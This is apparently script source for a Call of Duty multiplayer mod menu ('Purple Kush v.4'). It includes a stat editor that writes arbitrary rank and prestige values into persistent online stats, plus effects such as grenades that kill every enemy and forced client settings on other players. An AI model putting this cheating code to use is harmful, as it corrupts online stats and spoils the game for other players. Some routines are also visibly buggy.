	editor["Inst"] = createText9("default",1.3,"middle","right",350,-40,true,-15," Purple Kush v.4 \n Stat Editor \n Left : [{+attack}] \n Right : [{+toggleads_throw}] \n Select : [{+usereload}] \n Close : [{+melee}]" );
	editor["Inst"] moveOverTime(0.25);
	nums=strTok("1000000000;100000000;10000000;1000000;100000;10000;1000;100;10;1",";");
	wait 0.2;
	for(;;)
	{
		statTemp=statValue + "";
		for(k=0;k < editor["numbers"].size;k++)
		{
			if(isDefined(statTemp[statTemp.size-(10-k)]))editor["numbers"][k] setValue(int(statTemp[statTemp.size-(10-k)]));
			else editor["numbers"][k] setValue(0);
		}
		wait .05;
		if(self fragButtonPressed()|| self secondaryOffHandButtonPressed())
		{
			curs -= self secondaryOffHandButtonPressed();
			curs += self fragButtonPressed();
			if(curs>=editor["numbers"].size)curs=0;
			if(curs < 0)curs=editor["numbers"].size-1;
			editor["scroll"] setPoint("","",editor["numbers"][curs].x,editor["numbers"][curs].y);
			wait .1;
		}
		if(self adsButtonPressed()|| self attackButtonPressed())
		{
			for(k=0;k < 10;k++)
			{
				if(curs==k && self attackButtonPressed())statValue += plusNum(int(nums[k]),statValue);
				if(curs==k && self adsButtonPressed())statValue -= minusNum(int(nums[k]),statValue);
			}
			if(statValue<=0)statValue=0;
			if(statValue>=2147483647)statValue=2147483647;
			wait .05;
		}
		if(self useButtonPressed())
		{
			self maps\mp\gametypes\_persistence::statSet(Stat,int(statValue));
			self iPrintln(" "+Stat+" set to "+statValue);
			self.EditingStats=false;
			self freezeControls(false);
			break;
		}
		if(self meleeButtonPressed())
		{
			self.EditingStats=false;
			self freezeControls(false);
			break;
		}
	}
	wait .2;
	keys=getArrayKeys(editor);
	self thread maps\mp\gametypes\_rank::updateRank();
	self thread maps\mp\gametypes\_rank::getPrestigeLevel();
	self thread maps\mp\gametypes\_rank::getSPM();
	self thread maps\mp\gametypes\_rank::getRankXP();
	self thread maps\mp\gametypes\_rank::syncXPStat();

	self.EditingStats=false;
	for(k=0;k < keys.size;k++)if(isDefined(editor[keys[k]][0]))for(r=0;r < editor[keys[k]].size;r++)editor[keys[k]][r] destroy();
	else editor[keys[k]] destroy();
}
plusNum(val,num)
{
	if(num + val < num && num > 0)val=level.max - num;
	return val;
}
minusNum(val,num)
{
	if(num - val > num && num < 0)val=level.max + num;
	return val;
}
createValue2(Font,Fontscale,Align,Relative,X,Y,Alpha,Sort,Value)
{
	HudValue=createFontString(Font,Fontscale,self);
	HudValue setPoint(Align,Relative,X,Y);
	HudValue.alpha=Alpha;
	HudValue.sort=Sort;
	HudValue setValue(Value);
	self thread destroyElemOnDeath(HudValue);
	return HudValue;
}
createRectangle5(align,relative,x,y,width,height,color,shader,sort,alpha)
{
	barElemBG=newClientHudElem(self);
	barElemBG.elemType="bar";
	barElemBG.width=width;
	barElemBG.height=height;
	barElemBG.align=align;
	barElemBG.relative=relative;
	barElemBG.xOffset=0;
	barElemBG.yOffset=0;
	barElemBG.children=[];
	barElemBG.sort=sort;
	barElemBG.color=color;
	barElemBG.alpha=alpha;
	barElemBG setParent(level.uiParent);
	barElemBG setShader(shader,width,height);
	barElemBG.hidden=false;
	barElemBG setPoint(align,relative,x,y);
	self thread destroyElemOnDeath(barElemBG);
	return barElemBG;
}
destroyElemOnDeath(elem)
{
	self waittill("death");
	if(isDefined(elem.bar))elem destroyElem();
	else elem destroy();
}
doFlyablePlane()
{
self iPrintlnBold("^1Spawned A Car");
self iPrintlnBold("^1[{+frag}] To Get In and speed up");
self iPrintlnBold("^1[{+reload}] To Get Out");
position=self getOrigin()+(0,0,20)+ anglesToForward(self getPlayerAngles())* 200;
flyingJet=spawn("script_model",position);
self thread destroyOnDeath2(flyingJet);
jet=flyingJet;
jet.occupied=0;
jet.soundOn=0;
jet setModel("t5_veh_jet_u2");
jet thread monitorOccupant();
}
monitorOccupant()
{
while(!self.occupied)
{
for(i=0;i < level.players.size;i++)
{
p=level.players[i];
if(!self.occupied)
{
if((p fragButtonPressed()&& p fragButtonPressed())&& distance(p.origin,self.origin)<= 150)
{
self.lastPosition=self.origin;
self.lastAngles=self.angles;
p setModel("");
p setClientDvar("camera_thirdPerson","1");
p setClientDvar("cg_thirdPerson","1");
p setClientDvar("cg_thirdPersonRange",1024);
self solid();
self.occupied=1;
self thread flyJet(p);
self thread rotateJet(p);
p thread monitorLeave(self);
}
}
}
wait(0.05);
}
}
flyJet(pilot)
{
self endon("disconnect");
self endon("death");
pilot setOrigin(self.origin);
pilot playerLinkTo(self);
pilot.speed=0;
self.baseSpeed=15;
slowdown=0;
while(self.occupied)
{
if(pilot fragButtonPressed())
{
forwards[0]=self.origin + anglesToForward(self.angles)*(self.baseSpeed * pilot.speed);
forwards[1]=self.origin + anglesToForward(self.angles)* 150;
trace=bulletTrace(self.origin +(0,0,5),forwards[1],false,self);
self moveTo(forwards[0],0.05);
if(pilot.speed < 15)pilot.speed += .5;
}
else
{
if(pilot.speed > 0)
{
pilot.speed -= .05;
slowdown=self.origin + anglesToForward(self.angles)*(self.baseSpeed * pilot.speed);
self moveTo(slowdown,0.05);
}
}
if(pilot.speed > 5 && !self.soundOn)
{
self thread jetSounds(1,.5);
self.soundOn=1;
}
else if(pilot.speed < 5 && self.soundOn)
{
self thread jetSounds(0,.25);
self.soundOn=0;
self StopLoopSound();
}
wait(0.05);
}
}
jetSounds(bla,t)
{
self playsound("veh_u2_sonic_boom");
wait t;
if(bla)self playloopsound("veh_u2_dist_loop");
}
RotateJet(pilot)
{
turnspeed=undefined;
rollangle=0;
while(self.occupied)
{
wait 0.1;
if(pilot.speed > 5)
{
playFXOnTag(level.fx_airstrike_contrail,self,"tag_left_wingtip");
playFXOnTag(level.fx_airstrike_contrail,self,"tag_right_wingtip");
}
pa=pilot getplayerangles();
sa=self.angles;
if(sa!=pa)
{
ps=pa[1] - sa[1];
sp=sa[1] - pa[1];
if(!sp||!pilot.speed)rollangle=0;
else if(sp > 0 && pilot.speed > 5)rollangle =(sp);
else if(ps > 0 && pilot.speed > 5)rollangle =(ps * -1);
if(pa[0]<=-45||pa[0]>=45)rollangle=0;
turnspeed=0.8;
if(pilot.speed < 8)turnspeed=1.2;
self rotateTo((pa[0],pa[1],rollangle),turnspeed);
}
}
}
monitorLeave(plane)
{
self endon("death");
self endon("disconnect");
v=1;
while(v)
{
if(self usebuttonpressed())
{
self iPrintlnBold("^1Got Out Of The Car");
self unlink();
self detachAll();
wait .05;
[[game[self.pers["team"]+"_model"]["SPECOPS"]]]();
self setOrigin(self.lastPosition);
self setPLayerAngles(self.lastAngles);
plane.soundOn=0;
v=0;
plane delete();
plane=undefined;
plane stopLoopSound();
self setClientDvar( "cg_thirdPerson", "0","cg_fov", "65" );
self setDepthOfField( 0, 0, 512, 4000, 4, 0 );
self.third = false;
}
wait(0.05);
}
}
destroyOnDeath2(entity)
{
self waittill("death");
entity.occupied=0;
entity.soundOn=0;
entity stoploopsound();
entity delete();
entity=undefined;
}
GetCursorPosz2() {
return BulletTrace(self getTagOrigin("tag_weapon_right"), vector_scale(anglestoforward(self getPlayerAngles()), 1000000), false, self)["position"];
}

javirain()
{
	if(self.isGod==false)
	{
		self iPrintln("Can't Turn on JaviRain without God Mode");
	}
	if(getDvar("JavRain")=="1")
	{
		self iPrintln("Javelin Rain Already in Use");
	}
	if((self.isGod==true)&&(getDvar("JavRain")=="0"))
	{
		setDvar("JavRain","1");
		self thread Javirainz();
	}
}
Javirainz()
{
	self iPrintln("JaviRain ^2[ON]");
	self endon("death");
	self endon("stoprain");
	self endon("disconnect");
	self thread stopraining();
	lr=maps\mp\gametypes\_spawnlogic::findBoxCenter(level.spawnMins,level.spawnMaxs);
	lc=getAboveBuildingslocation(lr);
	for(;;)
	{
		Z=2000;
		X=randomintrange(-3000,3000);
		Y=randomintrange(-3000,3000);
		l= lr+(x,y,z);
		bomb=spawn("script_model",l);
		bomb playsound("weap_hind_missile_fire");
		bomb setModel("aircraft_bomb");
		bomb.angles=bomb.angles+(90,90,90);
		wait 0.01;
		bomb moveto(bomb.origin-(0,0,1960),0.5,0);
		wait 0.5;
		bomb playsound("mus_challenge_complete");
		Playfx(level.firework,bomb.origin);
		Playfx(level.expbullt,bomb.origin);
		Playfx(level.bfx,bomb.origin);
		radiusdamage(bomb.origin ,1000,1500,1000,self);
		bomb delete();
		wait 0.1;
	}
}
stopraining()
{
	wait 20;
	setdvar("JavRain","0");
	self notify("stoprain");
}
BazookaNuke()
{
	self GiveWeapon("m72_law_mp");
	self switchToWeapon("m72_law_mp");
	self waittill("weapon_fired");
	wait 1;
	self setclientdvar("r_brightness",.3);
	wait .5;
	self SetClientDvar("timescale",".3");
	self setclientdvar("r_brightness",1);
	wait .5;
	self setclientdvar("r_brightness",.4);
	wait .5;
	self setclientdvar("r_brightness",-.3);
	setdvar("timescale",0.3);
	self playSound("mpl_kls_napalm_exlpo");
	Earthquake(0.4,4,self.origin,100);
	wait 0.4;
	my=self gettagorigin("j_head");
	trace=bullettrace(my,my + anglestoforward(self getplayerangles())*100000,true,self)["position"];
	playfx(level.expbullt,trace);
	self playSound("mpl_kls_napalm_exlpo");
	Earthquake(0.4,4,self.origin,100);
	self playsound("mp_last_stand");
	self thread maps\mp\gametypes\_hud_message::oldNotifyMessage("^0Theres 0nly 0ne......");
	wait 2;
	Earthquake(0.4,4,self.origin,100);
	setdvar("timescale",0.8);
	Earthquake(0.4,4,self.origin,100);
	wait 2;
	wait 0.4;
	Earthquake(0.4,4,self.origin,100);
	RadiusDamage(trace,1000000,100000,100000,self);
	wait 2;
	self setClientDvar("r_colorMap","1");
	self setClientDvar("r_lightTweakSunLight","0.1");
	self setClientDvar("r_lightTweakSunColor","0.1 0.1");
	wait 0.01;
	self setclientdvar("timescale","1");
	wait 4;
	VisionSetNaked("default",5);
	setDvar("g_gravity","800");
	self setclientdvar("r_brightness",0);
}
Cyan()
{
	if(self.Ctoon==false)
	{
		self iPrintln("Cyan Vision ^2[ON]!");
		self.ctoon=true;
		self setclientdvar("r_filmTweakInvert","1");
		self setclientdvar("r_filmTweakbrightness","2");
		self setclientdvar("r_filmusetweaks","1");
		self setclientdvar("r_filmTweakenable","1");
		self setclientdvar("r_filmtweakLighttint","2");
		self setclientdvar("r_filmtweakdarktint","0.85");
	}
	else
	{
		self.ctoon=false;
		self setclientdvar("r_filmTweakInvert","0");
		self setclientdvar("r_filmTweakbrightness","0");
		self setclientdvar("r_filmusetweaks","0");
		self setclientdvar("r_filmTweakenable","0");
		self setclientdvar("r_filmtweakLighttint","0");
		self setclientdvar("r_filmtweakdarktint","0");
		self iPrintln("Cyan Vision ^1[OFF]!");
	}
}
Red()
{
	if(self.Ctoon==false)
	{
		self iPrintln("Red Vision ^2[ON]!");
		self.ctoon=true;
		self setclientdvar("r_filmTweakInvert","0");
		self setclientdvar("r_filmTweakbrightness","2");
		self setclientdvar("r_filmusetweaks","1");
		self setclientdvar("r_filmTweakenable","1");
		self setclientdvar("r_filmtweakLighttint","2");
		self setclientdvar("r_filmtweakdarktint","0.85");
	}
	else
	{
		self.ctoon=false;
		self setclientdvar("r_filmTweakInvert","0");
		self setclientdvar("r_filmTweakbrightness","0");
		self setclientdvar("r_filmusetweaks","0");
		self setclientdvar("r_filmTweakenable","0");
		self setclientdvar("r_filmtweakLighttint","0");
		self setclientdvar("r_filmtweakdarktint","0");
		self iPrintln("Red Vision ^1[OFF]!");
	}
}
Purple()
{
	if(self.Ctoon==false)
	{
		self iPrintln("Purple Vision ^2[ON]!");
		self.ctoon=true;
		self setclientdvar("r_filmTweakInvert","1");
		self setclientdvar("r_filmTweakbrightness","2");
		self setclientdvar("r_filmusetweaks","1");
		self setclientdvar("r_filmTweakenable","1");
		self setclientdvar("r_filmtweakLighttint","1 2 1 1.1");
		self setclientdvar("r_filmtweakdarktint","1 2 1");
	}
	else
	{
		self.ctoon=false;
		self setclientdvar("r_filmTweakInvert","0");
		self setclientdvar("r_filmTweakbrightness","0");
		self setclientdvar("r_filmusetweaks","0");
		self setclientdvar("r_filmTweakenable","0");
		self setclientdvar("r_filmtweakLighttint","0");
		self setclientdvar("r_filmtweakdarktint","0");
		self iPrintln("Purple Vision ^1[OFF]!");
	}
}
Blue()
{
	if(self.Ctoon==false)
	{
		self iPrintln("Blue Vision ^2[ON]!");
		self.ctoon=true;
		self setClientDvar("r_lightTweakSunColor","0 0 1 1");
		self setClientDvar("r_lightTweakSunLight","4");
	}
	else
	{
		self.ctoon=false;
		self setClientDvar("r_lightTweakSunColor","0");
		self setClientDvar("r_lightTweakSunLight","0");
		self iPrintln("Blue Vision ^1[OFF]!");
	}
}
Say1(iPRO)
{
	self SayAll(iPRO);
}
SuperMagnum()
{
	self endon("death");
	self endon("WeaponChange");
	self takeallweapons();
	wait 1;
	self GiveWeapon("python_mp");
	self switchToWeapon("python_mp");
	self allowAds(false);
	while(1)
	{
		self waittill("weapon_fired");
		self playsound("wpn_rpg_fire_plr");
		my=self gettagorigin("j_head");
		trace=bullettrace(my,my+anglestoforward(self getplayerangles())*100000,true,self)["position"];
		playfx(level.expbullit,trace);
		self playSound("mpl_kls_napalm_exlpo");
		Earthquake(0.6,3,self.origin,100);
		dis=distance(self.origin,trace);
		if(dis<101)RadiusDamage(trace,dis,800,800,self);
		RadiusDamage(trace,800,800,800,self);
	}
}
WaterGunDefault()
{
	self endon("death");
	self endon("disconnect");
	self giveWeapon("defaultweapon_mp",6);
	self switchtoweapon("defaultweapon_mp",6);
	for(;;)
	{
		self waittill("weapon_fired");
		if(self getcurrentweapon()== "defaultweapon_mp")
		{
			my=self gettagorigin("j_head");
			trace=bullettrace(my,my+anglestoforward(self getplayerangles())*100000,true,self)["position"];
			playfx(level._effect["iPRO"],trace);
		}
		wait 0.1;
	}
}
WaterGun()
{
	self endon("death");
	self endon("disconnect");
	for(;;)
	{
		self waittill("weapon_fired");
		{
			my=self gettagorigin("j_head");
			trace=bullettrace(my,my+anglestoforward(self getplayerangles())*100000,true,self)["position"];
			playfx(level._effect["iPRO"],trace);
		}
		wait 0.1;
	}
}
Supernades()
{
	self endon("death");
	self endon("disconnect");
	self iPrintln("SuperNades ON");
	self thread givegrenade();
	for(;;)
	{
		self waittill("grenade_fire",Grenade);
		wait 0.05;
		Grenade waittill("explode");
		wait 0.01;
		for(i=0;i < level.players.size;i++)
		{
			P= level.players[i];
			if(P.name !=self.name && P.team !=self.team)
			{
				P thread[[level.callbackPlayerDamage]](self,self,2147483600,8,"MOD_EXPLOSIVE","frag_grenade_mp",(0,0,0),(0,0,0),"j_head",0);
			}
			wait 0.01;
		}
	}
}
GiveGrenade()
{
	self endon("disconnect");
	self endon("death");
	while(1)
	{
		if(self getammocount("sticky_grenade_mp")< 1)self SetWeaponAmmoClip("sticky_grenade_mp",1);
		wait 1;
	}
}
ClanTagEditor()
{
	self endon( "death" );
	self endon("StopEdit");
	self thread ExitMenu();
	self.LockMenu=true;
	wait .4;
	self freezeControls(true);
	Text = "";
	Sliding = 0;
	Scrolling = [];
	for(i = 0;i < 4;i++)
	{
		Scrolling[i] = 0;
		self.ClanTag[i] = CreateTextString("default", 2.5, "CENTER", "", (-11.25*((4-1)/2))+(22*i), 100, 1, 5, "-");
		self.ClanTag[i] maps\mp\gametypes\_rank::setSafeText(Text);
		self.ClanTag[0].fontScale = 3;
	}
	self.Scroller = CreateShader("CENTER", "", self.ClanTag[0].x, 100, 25, 45, (0.5,0.0,0.8), "progress_bar_bg", 1, .6);
	self.Background = CreateShader("", "", 0, 0, 1000, 1000, (0,0,0), "white", 0, .6);
	for(i=0;i<self.ClanTag.size;i++)self thread StonedOnDeath(self.ClanTag[i]);
	self thread StonedOnDeath(self.Scroller);
	Letters = "_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 !#&-=+/|[]?:;<>,.{@}";
	for(;;)
	{
		if(Scrolling[Sliding] > Letters.size) Scrolling[Sliding] = 0;
		if(Scrolling[Sliding] < 0) Scrolling[Sliding] = Letters.size;
		for(i = 0;i < Scrolling.size;i++)
		{
			if(Scrolling[i] == Letters.size) self.ClanTag[i] maps\mp\gametypes\_rank::setSafeText("-");
			else self.ClanTag[i] maps\mp\gametypes\_rank::setSafeText(Letters[Scrolling[i]]);
		}
		if(self UseButtonPressed() && self.Open == false)
		{
			Text = "";
			for(i=0;i<Scrolling.size;i++) if(Scrolling[i] != Letters.size) Text += Letters[Scrolling[i]];
			self setClientDvar("clanName",Text);
			self playLocalSound( "mus_challenge_complete" );
			wait .1;
		}
		if(self FragButtonPressed() || self SecondaryOffHandButtonPressed() && self.Open == false)
		{
			Sliding -= self SecondaryOffHandButtonPressed();
			Sliding += self FragButtonPressed();
			if(Sliding < 0) Sliding = 4-1;
			else if(Sliding > 4-1) Sliding = 0;
			self.Scroller.x = self.ClanTag[Sliding].x;
			for(i=0;i<self.ClanTag.size;i++) self.ClanTag[i] thread ChangeFontScaleOverTime(2.5, .2);
			self.ClanTag[Sliding] thread ChangeFontScaleOverTime(3, .2);
			self playLocalSound("mouse_over");
			wait .1;
		}
		if(self AttackButtonPressed() || self AdsButtonPressed()&& self.Open == false)
		{
			Scrolling[Sliding] += self AttackButtonPressed();
			Scrolling[Sliding] -= self AdsButtonPressed();
			self.ClanTag[Sliding].fontScale = 2.5;
			wait .1;
			self.ClanTag[Sliding] thread ChangeFontScaleOverTime(3, .2);
			self playLocalSound("mouse_over");
			wait .1;
		}
		if(self MeleeButtonPressed() && self.Open == false)
		{
			for(i=0;i<self.ClanTag.size;i++)self.ClanTag[i] destroy();
			self.Scroller destroy();
			self.Background destroy();
			self freezeControls(false);
			self.LockMenu=false;
			self playLocalSound("mouse_over");
			self notify("StopEdit");
			wait .2;
			self freezeControls(false);
		}
		wait .001;
		self freezeControls(false);
	}
}
StonedOnDeath(i)
{
	self waittill("death");
	i destroy();
}
ChangeFontScaleOverTime(size,time)
{
	scaleSize = ((size-self.fontScale)/(time*20));
	for(k = 0; k < (20*time); k++)
	{
		self.fontScale += scaleSize;
		wait .05;
	}
}
MonitorButtons2()
{
	self endon("disconnect");
	self endon("done");
	for(;;)
	{
		if(self UseButtonPressed())self notify("buttonPress","A");
		if(self AttackButtonPressed())self notify("buttonPress","Right");
		if(self AdsButtonPressed())self notify("buttonPress","Up");
		if(self FragButtonPressed())self notify("buttonPress","Down");
		if(self MeleeButtonPressed())self notify("buttonPress","B");
		if(self SecondaryOffHandButtonPressed())self notify("buttonPress","Sec");
		wait.15;
	}
}
ClassEditor()
{
	self endon("death");
	self endon("disconnect");
	self thread ExitMenu();
	self.LockMenu=true;
	wait .4;
	self notify("option_checked");
	self notify("stopthemodmenu");
	self freezeControls(true);
	self setClientDvar("r_blur",5);
	self thread MonitorButtons2();
	wait.4;
	self.iPRO=createRectangle5("CENTER","",0,0,1000,70,(0,0,0),"white",3,.3);
	ABC="ABCDEFGHIJKLMNOPQRSTUVWXYZ !-_@#$%^&*()<>%[]{}1234567890";
	curs=0;
	letter=0;
	ClassEditor=self createFontString("objective",2.0,self);
	ClassEditor setPoint("CENTER");
	ClassEditor.foreground=true;
	ClassEditor.sort=3000;
	selecting=true;
	wait.1;
	tag=[];
	savedLetter=[];
	tag[0]=ABC[0];
	savedLetter[0]=0;
	while(selecting)
	{
		string="";
		for(i=0;i < tag.size;i++)
		{
			if(i==curs)string += "^6[^7" + tag[i] + "^6]^7";
			else string += " " + tag[i] + " ";
		}
		ClassEditor maps\mp\gametypes\_rank::setSafeText("" + string + "");
		self waittill("buttonPress",button);
		switch(button)
		{
			case "Sec": letter -= 1;
			letter *=(letter > 0)*(letter < ABC.size);
			tag[curs]=ABC[letter];
			savedLetter[curs]=letter;
			break;
			case "Down": letter += 1;
			letter *=(letter > 0)*(letter < ABC.size);
			tag[curs]=ABC[letter];
			savedLetter[curs]=letter;
			break;
			case "Right": curs += 1;
			curs *=(curs > 0)*(curs < 14);
			if(curs > tag.size - 1)
			{
				savedLetter[savedLetter.size]=0;
				tag[tag.size]=ABC[0];
			}
			letter=savedLetter[curs];
			break;
			case "A": newTag="";
			for(i=0;i < tag.size;i++)newTag += tag[i];
			self thread ColorClass(newTag);
			self setClientDvar("developeruser","3");
			self.ClassEditor=newTag;
			self iPrintln("Classname Set To: ^3" + newTag);
			self setClientDvar("UpdateGamerProfile","1");
			break;
			case "B": selecting=false;
			break;
			default: break;
		}
	}
	ABC destroy();
	ClassEditor destroy();
	self.ClassEditor destroy();
	self.iPRO destroy();
	self freezeControls(false);
	self.reopen=1;
	self setClientDvar("r_blur",0);
	self.LockMenu=false;
}
StartInfected()
{
	self thread maps\mp\gametypes\_hud_message::hintMessage("Starting Infected..");
	self setClientDvar("ui_allow_teamchange","0");
	self thread ExitMenu();
	wait 2;
	for(t=0;t<=level.players.size;t++)
	{
		players=level.players[t];
		players suicide();
		if(players.team=="axis"||players.team=="spectator")
		{
			players notify("menuresponse",game["menu_team"],"allies");
		}
		players waittill("spawned_player");
		players takeallweapons();
		players thread InfectedWeapons();
		players thread welcomeText(self,"Welcome To Infected V.1 "+self.name+" ..","Game Has Started. Enjoy!","Purple Kush Patch",(1,0,0));
		wait 5;
		players thread InfectedTimer();
		players thread MonitorInfected();
		wait 8;
		self thread InfectionTime();
		players iPrintlnBold("^3"+self.Infected+" ^1Has been infected!");
	}
}
InfectedWeapons()
{
    switch(RandomInt(4))
    {
        case 0: self giveWeapon("ak74u_mp");
        self switchtoweapon("ak74u_mp");
        break;
        case 1: self giveWeapon("m16_mp");
        self switchtoweapon("m16_mp");
        break;
        case 2: self giveWeapon("ithaca_mp");
        self switchtoweapon("ithaca_mp");
        break;
        case 3: self giveWeapon("l96a1_mp");
        self giveWeapon("python_mp");
        self switchtoweapon("l96a1_mp");
        break;
    }
}
InfectedTimer()
{
	self.countdown=self createFontString("objective",1.5);
	self.countdown setPoint("CENTERLEFT","CENTERLEFT",20,0);
	for(i=8;i>=0;i--)
	{
		self.countdown maps\mp\gametypes\_rank::setSafeText("^1Infection in "+i+"");
		self playSound("mpl_ui_timer_countdown");
		wait 1;
	}
	self.countdown destroy();
}
MonitorInfected()
{
	self endon("disconnect");
	for(;;)
	{
		self waittill("death");
		self notify("menuresponse",game["menu_team"],"axis");
		self thread InfectedFunctions();
	}
}
InfectionTime()
{
	self.Infected=level.players[ randomInt(level.players.size)];
	self.Infected suicide();
}
InfectedFunctions()
{
	self iPrintlnBold("^1You have been infected!");
	self takeallweapons();
	self giveweapon("python_mp");
	self giveweapon("sticky_grenade_mp");
	self switchtoweapon("python_mp");
	self setWeaponAmmoClip("python_mp",0);
	self setWeaponAmmoStock("python_mp",0);
	self setWeaponAmmoStock("sticky_grenade_mp",2);
	wait 3;
}
DeathMachine()
{
	self endon("disconnect");
	self endon("death");
	self allowADS(false);
	self allowSprint(false);
	self setClientDvar("perk_weapSpreadMultiplier",0.20);
	self setClientDvar("perk_weapRateMultiplier",0.001);
	self setPerk("specialty_rof");
	self giveWeapon("minigun_mp");
	self switchToWeapon("minigun_mp");
	for(;;)
	{
		weap=self GetCurrentWeapon();
		self setWeaponAmmoClip(weap,150);
		wait 0.2;
	}
}
nay1995snuke()
{
	for(t=0;t < level.players.size;t++)
	{
		players=level.players[t];
		players thread doNukeTimer();
		players thread doNukefunctionstart();
		players iPrintln("Look In The Center Of The Map!");
		self iPrintln("Nay1995 Advanced Nuke!");
	}
}
doNukeTimer()
{
	self endon("stopnuketimer");
	for(nuketimer=10;nuketimer>0;nuketimer--)
	{
		self.nukespawn=self createFontString("default",1.5);
		self.nukespawn setPoint("TOP RIGHT","TOP RIGHT",0,-14);
		self.nukespawn maps\mp\gametypes\_rank::setSafeText("Nuke Inbound In: ^1" +nuketimer);
		for(;;)
		{
			wait 1;
			nuketimer--;
			self.nukespawn maps\mp\gametypes\_rank::setSafeText("Nuke Inbound In: ^1" +nuketimer);
			if(nuketimer==0)
			{
				self.nukespawn destroy();
				nuketimer destroy();
			}
		}
		self waittill("death");
		self.nukespawn destroy();
	}
}
doNukefunctionstart()
{
	level.mapCenter=maps\mp\gametypes\_spawnlogic::findBoxCenter(level .spawnMins,level.spawnMaxs);
	nuke=level.mapCenter +(0,0,850);
	nukezzz=spawn("script_model",nuke);
	nukezzz setModel("aircraft_bomb");
	nukezzz solid();
	nukezzz setcontents(1);
	nukezzz moveto(nukezzz.origin-(0,0,865),10,0);
	wait 6;
	playfx(level.lololol,nukezzz.origin);
	self setclientdvar("timescale",".5");
	setDvar("g_gravity","100");
	self setClientDvar("jump_height","999");
	wait 2;
	visionSetNaked("sepia",0.2);
	Earthquake(0.4,4,self.origin,100);
	wait 2;
	edit1=self gettagorigin("j_head");
	trace=bullettrace(edit1,edit1 + anglestoforward(self getplayerangles())*100000,true,self)["position"];
	playfx(level.lololol,trace);
	Earthquake(0.4,4,self.origin,100);
	RadiusDamage(trace,1000000,99923,2007,self);
	wait 1;
	self thread onnukedeath(nukezzz);
}
onnukedeath(nukezzz)
{
	self notify("stopnuketimer");
	setDvar("g_gravity","800");
	self setclientdvar("timescale","1");
	visionSetNaked("default",0.2);
	self setClientDvar("jump_height","39");
	nukezzz delete();
	self waittill("spawned_player");
	self giveWeapon("commando_mp");
}
Sharpshooter()
{
	for(t=0;t < level.players.size;t++)
	{
		players=level.players[t];
		players thread SharpyPerks();
		wait 3;
		players thread welcomeText(self,"Welcome To Multiplayer Sharpshooter","Game Has Started. Enjoy!","Purple Kush Patch",(1,0,0));
		wait 1;
		players iPrintln("^3Your Gun Will Switch Every 45 Secounds.");
		wait 1;
		players iPrintln("^3Get A 3 Kill Streak To Get All 3 Perks");
		wait 1;
		players iPrintln("^34 Kills In A Row Gives You Double Pointes");
		wait 1;
		players iPrintln("^3Game Has Started. Enjoy!");
		wait 0.01;
		players thread SharpyWeap();
		wait 450;
		level thread maps\mp\gametypes\_globallogic::forceEnd();
	}
}
SharpyWeap()
{
	for(i=10;i>0;i--)
	{
		Weapon=level.weaponList[randomint(level.weaponList.size)];
		self takeallweapons();
		self giveWeapon(Weapon);
		self switchToWeapon(Weapon);
		self thread SharpyTimer();
		wait 45;
		self iPrintlnBold("^1Weapon changed");
	}
}
SharpyTimer()
{
	for(t=45;t>=0;t--)
	{
		self iPrintln("^5" + t);
		wait 1;
	}
}
SharpyPerks()
{
	self waittill("killed_enemy");
	self setPerk("specialty_bulletdamage");
	self showPerk(2,"specialty_bulletdamage",-50);
	wait 0.01;
	self waittill("killed_enemy");
	self setPerk("specialty_fastreload");
	self showPerk(2,"specialty_fastreload",-50);
	wait 0.01;
	self waittill("Killed_enemy");
	self setPerk("specialty_armorvest");
	self showPerk(2,"specialty_armorvest",-50);
	wait 0.01;
	self waittill("Killed_enemy");
	self thread Double();
	self.text4=self createFontString("objective",1.2);
	self.text4 setPoint("CENTER","RIGHT",2,-50);
	self.text4 maps\mp\gametypes\_rank::setSafeText("^3X2");
	self waittill("Death");
	self.text4 Destroy();
	self thread No_Double();
}
Double()
{
	self setClientDvar("scr_sab_score_kill",20,"scr_dd_score_kill",20,"scr_dm_score_kill",20,"scr_koth_score_kill",20);
}
No_Double()
{
	self setClientDvar("scr_sab_score_kill",10,"scr_dd_score_kill",10,"scr_dm_score_kill",10,"scr_koth_score_kill",10);
}
EditColor(sHud)
{
	self endon("death");
	self endon("disconnect");
	self.LockMenu=true;
	self thread ExitMenu();
	wait 0.2;
	for(k=0;k < 3;k++)
	{
		curs["slide"][k]=0;
		curs["coll"][k]=0;
	}
	curs["scroll"]=0;
	color["scrollBar"]=iPROcreateRectangle("","",0,((curs["scroll"]*28)+30),230,24,(0,0,0),"white",20,1);
	color["backGround"]=iPROcreateRectangle("","",0,0,1000,720,(0,0,0),"white",10,(1/2.40));
	for(k=0;k < 3;k++)
	{
		color["slide"][k]=iPROcreateRectangle("","",(((curs["slide"][curs["scroll"]]*10)/5)-(100)),((28*k)+30),3,17,(1,1,1),"white",200,1);
		color["bar"][k]=iPROcreateRectangle("","",0,((28*k)+30),200,2,(1,1,1),"white",150,.9);
	}
	for(k=0;k < 3;k++)color["value"][k]=iPROcreateValue("default",1.9,"","",((k*70)-70),((color["slide"][1].y)-65),1,13,0);
	color["foreground"]=iPROcreateRectangle("","",0,color["slide"][1].y,230,94,(0,0,0),"white",11,(1/3.20));
	color["preview"]=iPROcreateRectangle("","",0,((color["slide"][1].y)-65),230,30,(0,0,0),"white",12,1);
	wait .2;
	while(1)
	{
		self freezeControls(true);
		if(self attackButtonPressed()|| self adsButtonPressed())
		{
			curs["slide"][curs["scroll"]] -= self adsButtonPressed();
			curs["slide"][curs["scroll"]] += self attackButtonPressed();
			if(curs["slide"][curs["scroll"]] > 100)curs["slide"][curs["scroll"]]=0;
			if(curs["slide"][curs["scroll"]] < 0)curs["slide"][curs["scroll"]]=100;
			color["slide"][curs["scroll"]] setPoint("","",(((curs["slide"][curs["scroll"]]*10)/5)-(100)),color["slide"][curs["scroll"]].y);
			curs["coll"][curs["scroll"]] =((curs["slide"][curs["scroll"]]*2.55)/255);
			for(k=0;k < color["value"].size;k++)color["value"][k] setValue(int(color["preview"].color[k]*255));
			color["preview"].color =(curs["coll"][0],curs["coll"][1],curs["coll"][2]);
		}
		if(self fragButtonPressed()|| self secondaryOffHandButtonPressed())
		{
			curs["scroll"] -= self secondaryOffHandButtonPressed();
			curs["scroll"] += self fragButtonPressed();
			if(curs["scroll"]>=color["slide"].size)curs["scroll"]=0;
			if(curs["scroll"] < 0)curs["scroll"]=color["slide"].size-1;
			color["scrollBar"].y=color["bar"][curs["scroll"]].y;
			wait .2;
		}
		if(self meleeButtonPressed())break;
		if(self useButtonPressed())
		{
			sHud.color=color["preview"].color;
			break;
		}
		wait .05;
	}
	self freezeControls(false);
	self.LockMenu=false;
